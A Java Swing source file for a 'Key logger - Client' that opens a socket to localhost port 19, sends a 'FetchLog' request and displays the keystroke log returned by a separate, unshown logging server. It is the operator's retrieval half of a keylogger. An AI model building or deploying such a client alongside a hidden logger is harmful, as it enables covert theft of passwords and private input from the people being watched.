package com.hao.damang;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollBar;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

import org.omg.CORBA.INITIALIZE;

public class KeyLoggerClient extends JFrame implements ActionListener{
	static Socket socket;
	static int port = 19;
	static String host = "localhost";
	
	static DataInputStream din;
	static DataOutputStream dout;
		
	JTextArea logArea = null;
	
	public KeyLoggerClient() {
		setupFrame();
	}
	
	private void setupFrame() {
		setSize(new Dimension(500, 400));
		setTitle("Key logger - Client");
		JPanel panel = new JPanel();
		panel.setLayout(new BorderLayout());
		
		JPanel subPanel = new JPanel(new FlowLayout());
		
		// get log button
		JButton getLogBtn = new JButton("Get log");
		getLogBtn.setName("getLogBtn");
		getLogBtn.addActionListener(this);
		
		subPanel.add(getLogBtn);
		panel.add(subPanel, BorderLayout.NORTH);
		
		
		// log area
		logArea = new JTextArea(20, 20);
		logArea.setEditable(false);
		
		JScrollPane scrollPane = new JScrollPane(logArea);
		
		panel.add(scrollPane, BorderLayout.CENTER);
		this.setLocation(10, 50);
		this.getContentPane().add(panel);
		setVisible(true);
		setDefaultCloseOperation(EXIT_ON_CLOSE);
	}
	

@Override
public void actionPerformed(ActionEvent e) {
	String btnName = ((JButton) e.getSource()).getName();
	switch (btnName) {
	case "getLogBtn":
		logArea.setText(getLog());
		break;
	default:
		break;
	}
}

private String getLog() {
	System.out.println("Processing");
	String log = "";
	try {
		dout.writeUTF("FetchLog");
		System.out.println("Sent request");
		log = din.readUTF();
		
	} catch (IOException e) {
		e.printStackTrace();
	}
	return log;
}

private static void initializeSocket() {
	try {
		socket = new Socket(host, port);
		din = new DataInputStream(socket.getInputStream());
		dout = new DataOutputStream(socket.getOutputStream());		
	} catch (UnknownHostException e) {
		e.printStackTrace();
	} catch (IOException e) {
		e.printStackTrace();
	}
}
public static void main(String args[]) {
	new KeyLoggerClient();
	initializeSocket();
}

}
